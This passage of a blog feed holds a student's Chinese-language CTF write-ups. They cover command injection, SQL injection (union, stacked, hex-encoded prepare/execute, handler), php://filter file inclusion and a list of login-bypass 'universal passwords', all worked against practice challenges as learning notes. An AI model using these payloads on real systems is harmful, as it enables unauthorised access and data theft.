</code></p></blockquote><p>可以看到有两个反引号，这个是内联执行的符号，内联就是将反引号内命令的输出作为输入执行。可以看到反引号里面命令是ls，那么它执行完输出的就是包含的文件，其中就包含flag文件，随后内联执行将它输出的这俩个文件名再输入执行cat命令，这样就得到了文件的内容。是一个很巧妙的方法。轻松绕过了正则匹配。  </p><hr><p>关于绕过其实还是要多积累，多见识。。。。。。</p>]]></content>
      
      
      <categories>
          
          <category> test13 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习7</title>
      <link href="test12/undefined-undefined.html"/>
      <url>test12/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天练车，就先学习Linux命令使用吧。  </p><h1 id="ACTF2020-新生赛-Exec-1"><a href="#ACTF2020-新生赛-Exec-1" class="headerlink" title="[ACTF2020 新生赛]Exec 1"></a>[ACTF2020 新生赛]Exec 1</h1><p>打开题目，发现让我们ping一个网址<br><img src="https://i.loli.net/2021/01/21/FmHKRL1dN8cjblX.png" alt="52.png"><br>于是随便ping了一个网址。发现返回成功。那么接下来我们要查询包含的文件。如何做到多个语句的执行呢，这里需要用到管道符，从而达到多命令执行的效果。<br><a href="https://blog.csdn.net/liucy007/article/details/90209277?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control">Linux之管道符</a><br><img src="https://i.loli.net/2021/01/21/zliKdXRn1bqmcDp.png" alt="53.png"><br>首先我们先查询文件，使用ls命令。<br><img src="https://i.loli.net/2021/01/21/1dknwmhKyL7O6Ce.png" alt="54.png"><br>知道包含一个index.php文件，接着打开这个文件。  </p><blockquote><p>127.0.0.1;cat index.php</p></blockquote><p><img src="https://i.loli.net/2021/01/21/zIcaZ4U3Ef1TMSG.png" alt="55.png"><br>可以在网页源码中发现文件的里面的代码，或者使用tac命令也可以显示源码。<br>可以看到源码中没有任何过滤，是一个简单的命令执行。但是我们用ls并没有发现flag文件，说明它可能在别的目录下。<br>于是可以使用ls /来查看根目录。<br><img src="https://i.loli.net/2021/01/21/Cl5cjAQXuyZon8h.png" alt="56.png"><br>发现包含flag的文件，使用cat /flag查看这个文件的内容。<br><img src="https://i.loli.net/2021/01/21/JXkoVDpbTfj3tda.png" alt="57.png"><br>得到flag。  </p><hr><p>这道题主要考察命令执行和Linux的命令使用，不算很难，管道符的使用是第一次见，感觉和sql注入的“；”和联合注入有相同的地方，都是为了执行多个语句。下面附上一些常用的管道符。  </p><blockquote><p><strong>1、|（就是按位或），直接执行|后面的语句</strong></p></blockquote><blockquote><p><strong>2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</strong></p></blockquote><blockquote><p><strong>3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假</strong></p></blockquote><blockquote><p><strong>4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</strong></p></blockquote><blockquote><p><strong>5、;（linux下有的，和&amp;一样的作用）</strong>  </p></blockquote><p>同时附上一篇讲解Linux命令的博客，讲的十分详细了。<br><a href="https://blog.csdn.net/xiaoguaihai/article/details/8705992?ops_request_misc=&request_id=&biz_id=102&utm_term=linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-8705992.pc_search_result_before_js&spm=1018.2226.3001.4187">【Linux】linux常用基本命令 </a></p>]]></content>
      
      
      <categories>
          
          <category> test12 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql闯关2</title>
      <link href="test11/undefined-undefined.html"/>
      <url>test11/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>这个第二关就是第一关的一个变形。  </p><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>打开界面，按照流程先来判断注入类型。  </p><blockquote><p>?id=1 and 1=1<br>?id=1 and 1=2<br>?id=1’ and ‘1’=’1<br>?id=1’ amd ‘1’=’2</p></blockquote><p>在做这道题之前没有发现为什么要判断这个注入类型，因为看到别人用的语句没有什么变化，但是这道题让我知道二者还是有区别的。详细还是看这篇文章吧。<br><a href="https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=&request_id=&biz_id=102&utm_term=%25E4%25B8%25BA%25E4%25BB%2580%25E4%25B9%2588sql%25E6%25B3%25A8%25E5%2585%25A5%25E8%25A6%2581%25E4%25BD%25BF%25E7%2594%25A8%25E5%258D%2595%25E5%25BC%2595%25E5%258F%25B7&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-90296495.first_rank_v2_pc_rank_v29">sql注入基础原理（超详细)</a><br>简而言之，当是数字型注入时，后台执行的sql语句在id=1后面和句子后面是没有<strong>“</strong>‘<strong>”</strong>的，这也就是说，我们不需要构建payload时在结<br>尾加上注释符号#或者–+了。其余的和字符型注入相比没什么变化。  </p><hr><p><strong>数字型注入后台执行的sql语句</strong></p><blockquote><p>select * from &lt;表名&gt; where id = x and 1=1</p></blockquote><p><strong>字符型注入后台执行的sql语句</strong></p><blockquote><p>select * from &lt;表名&gt; where id = ‘x’ and ‘1’=’1’</p></blockquote><hr><p>接下来按照流程就行了。<br>爆库名和表名 </p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),database()–+</p></blockquote><p>爆字段名  </p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),(select group _concat(table _name) from information _schema.tables where table _  schema=’security’)</p></blockquote><p>爆字段信息  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote><hr><p>这道题算是进一步让我明白数字型注入和字符型注入了。<br>其实关于sql注入，其实也就是利用对输入字符的筛选漏洞来执行一些恶意的sql语句。sql语句不难学，主要还是如何找到它筛选的漏洞和如何绕过他们的筛选。</p>]]></content>
      
      
      <categories>
          
          <category> test11 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习6</title>
      <link href="test10/undefined-undefined.html"/>
      <url>test10/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天还是sql注入题，巩固基础。  </p><h1 id="极客大挑战-2019-LoveSQL-1"><a href="#极客大挑战-2019-LoveSQL-1" class="headerlink" title="[极客大挑战 2019]LoveSQL 1"></a>[极客大挑战 2019]LoveSQL 1</h1><p>打开题目，发现和前面做过的一样的界面。<br><img src="https://s3.ax1x.com/2021/01/20/sWlHgS.md.png" alt="sWlHgS.md.png"><br>先想到的就是用万能密码来做一下。输入1’ or 1=1#登录后后出现另一个界面。<br><img src="https://s3.ax1x.com/2021/01/20/sW3mZj.md.png" alt="sW3mZj.md.png"><br>给了我们用户名和密码，回到原界面输入用户名和密码后发现又回到这个页面。所以说万能密码不能解决问题。<br>那么还是老老实实按步骤来吧。先看看有几个字段。<br>发现当输到<strong>1’ order by 4#**出现报错，而前面的都是显示密码和用户名错误。（</strong>注意在用户名一栏中输入以上语句后因为后面有#，相当于把密码注释掉了，所以密码输入什么无关紧要。**）<br>那么就有三个字段，接着看看哪几位会有回显。输入1’ union select 1,2,3#<br><img src="https://i.loli.net/2021/01/20/q8XwkGx3vc7fJOi.png" alt="48.png"><br>可以看到2，3位有回显，那么这道题就变成之前做过的闯关第一关的样题了。<br>输入?id=1’ union select 1,2,database()#爆库名<br><img src="https://i.loli.net/2021/01/20/LSZJ6zGc73pObuj.png" alt="49.png"><br>得到库名，接下来就是爆表名，爆字段了。  </p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’geek’),database()#</p></blockquote><p><img src="https://i.loli.net/2021/01/20/NOkZo6mbBsPRdEV.png" alt="50.png"><br>得到表名,我们查看l0ve1ysq1这个表里面的字段。  </p><blockquote><p>select group_ concat(column_name) from information _ schema.columns where table _name=’l0ve1ysq1’ </p></blockquote><p><img src="https://i.loli.net/2021/01/20/sqy9Tb6ptg2JZr3.png" alt="51.png"><br>得到表里面的字段名字，接下来就是分别查这三个字段里面的信息。  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote><p>flag在password里。  </p><hr><p>这道题其实就是闯关第一关的翻版。并不是很难。</p>]]></content>
      
      
      <categories>
          
          <category> test10 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习5</title>
      <link href="test9/undefined-undefined.html"/>
      <url>test9/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天来一道捉迷藏的题目。  </p><h1 id="极客大挑战-2019-Secret-File-1"><a href="#极客大挑战-2019-Secret-File-1" class="headerlink" title="[极客大挑战 2019]Secret File 1"></a>[极客大挑战 2019]Secret File 1</h1><p>打开题目，发现如下界面。<br><img src="https://s3.ax1x.com/2021/01/19/sg4bfx.md.png" alt="sg4bfx.md.png"><br>看见这种界面，而且没有可以点的地方的题目一律f12伺候。<br>从源码中可以看到有一个php文件。<br><img src="https://s3.ax1x.com/2021/01/19/sgIlad.md.png" alt="sgIlad.md.png"><br>于是我们就打开这个Archive_room.php文件。<br><img src="https://s3.ax1x.com/2021/01/19/sgTS74.md.png" alt="sgTS74.md.png"><br>果然跳转到另一个页面，这次还有一个点击按钮，点一下试试。<br><img src="https://s3.ax1x.com/2021/01/19/sgbM4J.md.png" alt="sgbM4J.md.png"><br>就知道不会那么简单，对这种一闪而过的情况直接进行抓包，给他拦下来。<br><img src="https://s3.ax1x.com/2021/01/19/sgbW5Q.md.png" alt="sgbW5Q.md.png"><br>通过抓包可以看到中间还经过了一个php页面，于是再回到题目中输入一下。<br><img src="https://s3.ax1x.com/2021/01/19/sgqwZT.md.png" alt="sgqwZT.md.png"><br>跳转到源码页面了。<br>这个代码很容易懂，通过get方式传参一个file变量，而且有include()<br>函数，很明显是一个文件包含漏洞。可以用伪协议来做这道题。同时可以看到它过滤了一些伪协议，但是相较于之前学长出过的题过滤的还是太轻了（哈哈哈哈哈）。<br>直接使用php://filter协议读取flag.php里面的源码。构造payload。  </p><blockquote><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p></blockquote><p>这样就能得到经过base64编码过的源码，再解码一下就能得到flag。<br><img src="https://s3.ax1x.com/2021/01/19/sgjXcj.md.png" alt="sgjXcj.md.png"><br>这道题目主要还是找到藏着的php文件，后面的代码审计反而比较简单。 </p><hr><p>附上我的php伪协议笔记<br><a href="https://george186.github.io/note2/undefined-undefined.html">php伪协议总结</a></p>]]></content>
      
      
      <categories>
          
          <category> test9 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>万能密码总结</title>
      <link href="note3/undefined-undefined.html"/>
      <url>note3/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>将从网上查到的一些sql注入的万能密码记录下来，以便以后使用。  </p><h1 id="PHP语言"><a href="#PHP语言" class="headerlink" title="PHP语言"></a>PHP语言</h1><p>‘or 1=1/*<br>“or “a”=”a<br>“or 1=1–<br>“or”=”<br>“or”=”a’=’a<br>“or1=1–<br>“or=or”<br>‘’or’=’or’<br>‘) or (‘a’=’a<br>‘.).or.(‘.a.’=’.a<br>‘or 1=1<br>‘or 1=1–<br>‘or 1=1/*<br>‘or”=”a’=’a<br>‘or’ ‘1’=’1’<br>‘or’’=’<br>‘or’’=’’or’’=’<br>‘or’=’1’<br>‘or’=’or’<br>‘or.’a.’=’a<br>‘or1=1–<br>1’or’1’=’1<br>a’or’ 1=1–<br>a’or’1=1–<br>or ‘a’=’a’<br>or 1=1–<br>or1=1–  </p><h1 id="asp-aspx语言"><a href="#asp-aspx语言" class="headerlink" title="asp aspx语言"></a>asp aspx语言</h1><p>“or “a”=”a<br>‘.).or.(‘.a.’=’.a<br>or 1=1–<br>‘or 1=1–<br>a’or’ 1=1–<br>“or 1=1–<br>‘or.’a.’=’a<br>“or”=”a’=’a<br>‘or’’=’<br>or’=’or’  </p><h1 id="jsp语言"><a href="#jsp语言" class="headerlink" title="jsp语言"></a>jsp语言</h1><p>1’or’1’=’1<br>admin’ or 1=1/*  </p>]]></content>
      
      
      <categories>
          
          <category> note3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习4</title>
      <link href="test8/undefined-undefined.html"/>
      <url>test8/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天还是注入题。  </p><h1 id="极客大挑战-2019-EasySQL-1"><a href="#极客大挑战-2019-EasySQL-1" class="headerlink" title="[极客大挑战 2019]EasySQL 1"></a>[极客大挑战 2019]EasySQL 1</h1><p>打开页面，发现这次和之前的注入有点不一样。<br><img src="https://s3.ax1x.com/2021/01/18/scS2bq.md.png" alt="scS2bq.md.png"><br>这次让输入两个值，分别是用户名和密码，而之前输入的都只有一个。但是还是按照之前的顺序来，先判断有没有注入。<br>输入username=1’,password=1’发现回显出错。<br><img src="https://s3.ax1x.com/2021/01/18/scpQLn.md.png" alt="scpQLn.md.png"><br>由出错可以判断出是字符型注入。<br>接着是查询字段，但是输入1’ order by 1# 等却无法查询，仍然是报错。<br>那就跳过这一步，接着就是查看是否有显示位。我输入的是  </p><blockquote><p>username=999’ union select 1,2,database()#</p></blockquote><p>结果直接出flag了，十分懵b。<br><img src="https://s3.ax1x.com/2021/01/18/sc9qN6.md.png" alt="sc9qN6.md.png"><br>接着我又查了一下别人的做法，发现别人用到了万能密码来做，下面讲解一下万能密码。  </p><hr><h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><p>用户进行用户名和密码验证时，网站需要查询数据库。查询数据库就是执行SQL语句。<br>用户登录时，后台执行的数据库查询操作（SQL语句）是：<br>【Select user _ id,user _ type,email From users Where user _ id=’用户名’ And password=’密码’】。<br>由于网站后台在进行数据库查询的时候没有对单引号进行过滤，当输入用户名【admin】和万能密码【2’or’1】时，执行的SQL语句为：<br>【Select user _ id,user _ type,email From users Where user _ id=’admin’ And password=’2’or’1’】。<br>由于SQL语句中逻辑运算符具有优先级，【=】优先于【and】，【and】优先于【or】，且适用传递性。因此，此SQL语句在后台解析时，分成两句：<br>【Select user _ id,user _ type,email From users Where user _ id=’admin’ And password=’2’】和【’1’】，两句bool值进行逻辑or运算，恒为TRUE。<br>SQL语句的查询结果为TRUE，就意味着认证成功，也可以登录到系统中。<br>输入用户名【admin】，密码【2’or’1】，即可登录成功。  </p><hr><p>简而言之这个就是利用or的判定方式（左右两边只要一边为真，那么总体为真）来通过SQL语句的查询认证。同理，万能密码还会有很多，比如username=1’ or 1=1#,这样实际上执行的SQL语句就成为了<br>【Select user _ id,user _ type,email From users Where username=’1’】和【1=1】。（#为SQL的注释符，所以#后面的字符不再进行判定）<br>因为后面为真，所以SQL语句查询where的判定为真。也就通过了查询认证，所以得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> test8 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入闯关1</title>
      <link href="test7/undefined-undefined.html"/>
      <url>test7/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>要想学sql注入，就要不断练习。而sqli-labs这个闯关游戏就是一个很好的练习条件。这个寒假要过前十关。<br>关于这个游戏的安装百度即可，就不做详细记录了。<br><a href="https://blog.csdn.net/weixin_42277564/article/details/80583959?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161090447216780269871621%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&request_id=161090447216780269871621&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-80583959.first_rank_v2_pc_rank_v29&utm_term=sql%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2">sql注入的联合查询</a></p><h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>打开第一关，可以看到很简洁的界面。<br><img src="https://s3.ax1x.com/2021/01/17/syuvdg.md.png" alt="syuvdg.md.png"><br>让我们在url中输入变量id。先输入?id=1后回显如下。<br><img src="https://s3.ax1x.com/2021/01/17/syKOpR.md.png" alt="syKOpR.md.png"><br>但是输入?id=1’后报错，说明存在sql注入。<br>接下来按照程序一步步来。先来判断注入类型。  </p><blockquote><p>?id=1 and 1=1<br>?id=1 and 1=2<br>?id=1’ and ‘1’=’1<br>?id=1’ amd ‘1’=’2</p></blockquote><p>发现最后一个没有回显，所有知道是字符型注入。<br>接着判断字段个数。  </p><blockquote><p>?id=1’ order by 1–+<br>?id=1’ order by 2–+<br>?id=1’ order by 3–+<br>?id=1’ order by 4–+</p></blockquote><p>发现第四个时出现错误，说明有这个表有三个字段，也就是三列。<br><img src="https://img.imgdb.cn/item/600460473ffa7d37b3b711fa.png"><br>接着查看页面的显示位。也就是拿哪几位会显示到界面上。输入以下payload  </p><blockquote><p>?id=999’ union select 1,2,3–+</p></blockquote><p>注意不能是?id=1或?id=2之类的，因为这样会输出id=1或id=2的一行行的数据，这就无法判断是那一位回显到页面上了。但如果我们输入一个不存在的id，那么第一行就会变成空行，这时候union后面的查询语句就成为了第一行，相应的2，3位就显示在页面上了。<br><img src="https://img.imgdb.cn/item/600462263ffa7d37b3b7ed5a.png"><br>可以看出2，3位回显到页面，那么接下来构造payload要在2，3为上改动。<br>接下来爆库名  </p><blockquote><p>?id=1’ union select 1,2,database()–+</p></blockquote><p>可以查看当前使用的库的名称。<br><img src="https://s3.ax1x.com/2021/01/18/sylSFe.md.png" alt="sylSFe.md.png"><br>可以知道数据库的名字为<strong>security</strong>，接下来就是爆这个数据库中的表名了。这里的语句比较长，但是很好理解，语句如下。  </p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),database()–+</p></blockquote><p>注意这个语句要用括号括起来，否则会出错。具体原因我还没有找到。。。。<br>那么我们来理解一下这个新的长语句的意思吧。  </p><hr><blockquote><p>(select group _concat(table _name) from information _schema.tables where table _  schema=’security’)</p></blockquote><p>这个句子中有一个group_ concat()函数，这个函数的作用将对应字段的所有结果都查找并组合返回到一条记录中。<br><code>在SQL中这个函数可以将某一字段符合要求的该段对应的行的数据在一行显示。</code><br>而table _name很好理解，它就是表的名字的意思。<br>接下来是information _schema.tables。我们已经知道information _schema是系统自带的库，它包含了所有库的信息。所以information _schema.tables就是所有库中的表的信息。<br>where这个相当于编程中的if语句，它是一个判断语句。<br>table _ schema是数据库名称的意思。  </p><hr><p>综上可以知道这个语句的意思：从information _schema.tables中查询表的名字当数据库的名字为’security’。<br>也就是查询’security’库中所有表的名字并返回到到一条记录中。<br>得到的结果如图。<br><img src="https://s3.ax1x.com/2021/01/18/sy1z2d.md.png" alt="sy1z2d.md.png"><br>可以得到security库中有emails，referers，uagents，users四个表。<br>那么接下来就是爆字段了。  </p><blockquote><p>select group_ concat(column_name) from information _ schema.columns where table _name=’users’ </p></blockquote><p>爆出users表中的字段。<br><img src="https://s3.ax1x.com/2021/01/18/sy3GiF.md.png" alt="sy3GiF.md.png"><br>可以知道有id，username，password三个字段。那么接下来就是查询这三列的信息了。  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote><p><img src="https://s3.ax1x.com/2021/01/18/syGi4S.md.png" alt="syGi4S.md.png"><br>from security.users表示从security数据库users表中查询。<br>得到用户信息。其他的表按照上述操作即可。</p><hr><h1 id="知识点小结："><a href="#知识点小结：" class="headerlink" title="知识点小结："></a>知识点小结：</h1><p>1：database()是一个函数，可以查看当前使用的数据库名字。<br>2：group_ concat()函数，这个函数的作用将对应字段的所有结果都查找并组合返回到一条记录中。<br>3：information _schema.tables包含了所有库中表的信息，此外还有information _schema.columns（包含所有库中列的信息。）等。<br>4：table _name，columns _ name等均可以直译。<br>5：sql注入语句逻辑很好理解，可以当成英语语句或者编程语句来理解。大致如下：<br>select ···查询···<br>from ···从···中<br>where···当···时</p>]]></content>
      
      
      <categories>
          
          <category> test7 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习3</title>
      <link href="test6/undefined-undefined.html"/>
      <url>test6/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天练手第一道sql注入题目<br>先附上我学习sql注入的几个博客链接，他们帮了我很多忙。<br><a href="https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=&request_id=&biz_id=102&utm_term=%25E4%25B8%25BA%25E4%25BB%2580%25E4%25B9%2588sql%25E6%25B3%25A8%25E5%2585%25A5%25E8%25A6%2581%25E4%25BD%25BF%25E7%2594%25A8%25E5%258D%2595%25E5%25BC%2595%25E5%258F%25B7&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-90296495.first_rank_v2_pc_rank_v29">sql注入基础原理（超详细)</a>  </p><h1 id="强网杯-2019-随便注-1"><a href="#强网杯-2019-随便注-1" class="headerlink" title="[强网杯 2019]随便注 1"></a>[强网杯 2019]随便注 1</h1><p>题目说是随便注，他可一点也不随便啊，它是有备而来。打开题目发现很简洁。<br><img src="https://s3.ax1x.com/2021/01/17/ssnrz6.md.png" alt="ssnrz6.md.png"><br>因为是新手，所以一步一步来。<br>输入1’提交发现回显错误。由此可以知道存在sql注入。<br><img src="https://s3.ax1x.com/2021/01/17/ssn2ee.md.png" alt="ssn2ee.md.png"><br>先输入以下payload来判断是什么类型的注入。  </p><blockquote><p>1 and 1=1<br>1 and 1=2<br>1’ and ‘1’=’1<br>1’ and ‘1’=’2</p></blockquote><p>发现只有第四个输入时报错，所以可以知道这个是字符型注入。<br>接下来就是查询有几个字段。分别输入以下来查询字段个数。  </p><blockquote><p>1’ order by 1#<br>1’ order by 2#<br>1’ order by 3#</p></blockquote><p>发现当输入到**1’ order by 3#**时报错，说明该表只有两个字段。（也就是两列）<br><img src="https://s3.ax1x.com/2021/01/17/ssKAu8.md.png" alt="ssKAu8.md.png"><br>接下来就是爆表爆库了，我一开始打算使用联合查询来查当前数据库名。输入了以下语句。  </p><blockquote><p>1’ union select database()#</p></blockquote><p>结果却是这样。<br><img src="https://s3.ax1x.com/2021/01/17/ssKDKK.md.png" alt="ssKDKK.md.png"><br>一个正则匹配函数把selet字符给过滤了。这就说明我不能使用联合查询了。那该怎么办呢，通过查询资料发现还有一种堆叠注入方式可以实现查询。  </p><blockquote><p>堆叠注入：在SQL中，分号表示一条sql语句的结束，在结束一条sql语句后继续下一条语句，会被一起执行；这也就形成了堆叠注入。</p></blockquote><p>其次select，where字符被屏蔽，那么该如何查表名和库名呢。<br><strong>可以使用show。</strong>  </p><blockquote><p>1.show databases;数据库名字<br>2.show tables;表名<br>3.show columns from table;字段</p></blockquote><p>所以可以构建以下语句来查表名，库名。  </p><blockquote><p>1’; show databases;#</p></blockquote><p><img src="https://s3.ax1x.com/2021/01/17/ssNBH1.md.png" alt="ssNBH1.md.png"><br>得到所有库名，其中information_schema和performance _schema，test是自带的库，经过查询发现flag是在supersqli这个库中，输入</p><blockquote><p>1’;show tables from supersqli;#</p></blockquote><p>就可以得到supersqli库中表的名字。<br><img src="https://s3.ax1x.com/2021/01/17/ssURiV.md.png" alt="ssURiV.md.png"><br>分别查询这两个表中的字段。  </p><blockquote><p>1’;show columns from words;#<br>1’;show columns from <code>1919810931114514</code>;#</p></blockquote><p>注意在查询1919810931114514库时，直接输入其库名是查不出来的，这是因为这个库名会和MySQL的关键字冲突，这时候要在库名前后加上“`”这个符号来说明它不是关键字，也就是转义。<br>查询后发现flag字符串在1919810931114514表内。<br><a href="https://imgchr.com/i/ssaawR"><img src="https://s3.ax1x.com/2021/01/17/ssaawR.md.png" alt="ssaawR.md.png"></a><br>接下来就是如何读取flag字段中的内容了。<br>因为select不能使用，在网上查询后得知还有handler语句可以查询表中数据，语法为  </p><blockquote><p>HANDLER tbl_ name OPEN打开一张表<br>HANDLER tbl_ name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</p></blockquote><p>所以试着输入以下语句  </p><blockquote><p>1’;handler <code>1919810931114514</code> open;handler <code>1919810931114514</code> read first;–+</p></blockquote><p>这里的注释要用–+，使用#注释会显示不出来（我还不知道为什么）可能是没转码。<br>这样就可以得到flag。  </p><hr><p>但是这种方法只对于MySQL有用，应该还有别的通用方法，我查询了更多人的wp，发现的确如此。<br>因为select被过滤了，所以先将select * from 1919810931114514进行16进制编码，在构造  </p><blockquote><p>1’;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</p></blockquote><p>进而得到flag<br>或者</p><blockquote><p>1’;set @a=concat(“sel”,”ect flag from 1919810931114514 “);prepare hi from @a;execute hi;#  </p></blockquote><p>也可得到flag</p><p>其中prepare…from…是预处理语句，会进行编码转换。<br>execute用来执行由SQLPrepare创建的SQL语句。<br>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。<br>也就是说先给@a赋值为select * from 1919810931114514的十六进制编码。，然后后再使用prepare…from…进行编码转换，从而查询表中的所有信息。  </p><hr><p>还有一种方法，就是先用rename将words表名改为其他名字，再将1919810931114514表名改为words，将flag列改为id，最后输入1’ or 1=1#来查看flag列的内容。<br>但是这个方法我还没试成功过，思路是没问题的，只是我暂时没搞懂(太菜了）。 </p>]]></content>
      
      
      <categories>
          
          <category> test6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习2</title>
      <link href="test5/undefined-undefined.html"/>
      <url>test5/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>最近两天刚学sql注入，发现还是要有数据库的基础才行，（否则连sql的语句都看不懂啥意思）所以正在学数据库，sql的题暂时就先放一下，先做别的题了。当然也会更新一下学数据库的笔记。  </p><h1 id="极客大挑战-2019-Havefun-1"><a href="#极客大挑战-2019-Havefun-1" class="headerlink" title="[极客大挑战 2019]Havefun 1"></a>[极客大挑战 2019]Havefun 1</h1><p>这道题目还是很简单的，打开题目发现一只猫。<br><img src="https://s3.ax1x.com/2021/01/16/sDcJEQ.md.png" alt="sDcJEQ.md.png"><br>对于这种页面点不动的题，直接查看源码。<br><img src="https://s3.ax1x.com/2021/01/16/sDc5DO.md.png" alt="sDc5DO.md.png"><br>可以看到源码中将<strong>cat</strong>设为变量，并使用get方式传参。后面又说当变量cat==dog这个字符串时，就会显示flag。<br>那么接下来就很简单了。直接在url上输入就可以了。<br><img src="https://s3.ax1x.com/2021/01/16/sDgjY9.md.png" alt="sDgjY9.md.png"><br>得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> test5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习1</title>
      <link href="test4/undefined-undefined.html"/>
      <url>test4/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>寒假到了，菜鸡练习时间到了。争取每天至少buuctf一道题，并且加上sql注入的学习。<br>因为太长没练手了，所以先来一道代码审计题。</p><h1 id="HCTF-2018-WarmUP1"><a href="#HCTF-2018-WarmUP1" class="headerlink" title="[HCTF 2018]WarmUP1"></a>[HCTF 2018]WarmUP1</h1><p>打开题目发现只有一个大滑稽。<br>于是查看源码<br><img src="https://s3.ax1x.com/2021/01/15/s0MjeJ.md.png" alt="s0MjeJ.md.png"><br>发现&lt; !–source.php– &gt;这个php文件，于是再在网址中打开就可以发现真正的源码（截图没有截全）<br><img src="https://s3.ax1x.com/2021/01/15/s0QJTs.md.png" alt="s0QJTs.md.png"><br>观察可以发现还有一个hint.php文件，于是在网址打开它看一下。<br><img src="https://s3.ax1x.com/2021/01/15/s0QX1f.md.png" alt="s0QX1f.md.png"><br>可以知道flag被放在ffffllllaaaagggg目录中，又因为下面的代码中有include（）这个包含函数，并且要上传file这个参数。<br><img src="https://s3.ax1x.com/2021/01/15/s0lI2V.md.png" alt="s0lI2V.md.png"><br>这就要求我们要满足 checkFile(&amp;$page)函数，然后再构造payload，使用../进行跳转到ffffllllaaaagggg目录，就可以得到flag。<br>那么接下来就是对这个函数进行研究。  </p><blockquote><p>if (! isset($page) || !is_string($page))</p></blockquote><p>由这串代码可以看出page为变量，同时是一个字符串。<br>随后这个程序定义了两个字符串为白名单（$whitelist）也就是可以通过的字符串。分别为  </p><blockquote><p>source.php和hint.php</p></blockquote><p>也就是说我们的上传的变量<strong>page</strong>经过变换后要是上面二者之一才能通过checkFile(&amp;$page)函数。  </p><hr><p>先看第一个判断  </p><pre><code>            if (in_array($page, $whitelist)) &#123;                return true;            &#125;</code></pre><p>可以看出这个是直接将page和白名单进行比较，虽然我们直接输入那两个字符串就可以通过，但是这样没有办法用../来跳转目录，所以第一个是没办法绕过的。  </p><hr><p>再来看第二个。  </p><pre><code>            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;  </code></pre><p>这个里面的新函数有substr()和strpos()。  </p><blockquote><p>mb _ substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。<br>其中该函数有三个参数</p></blockquote><p><img 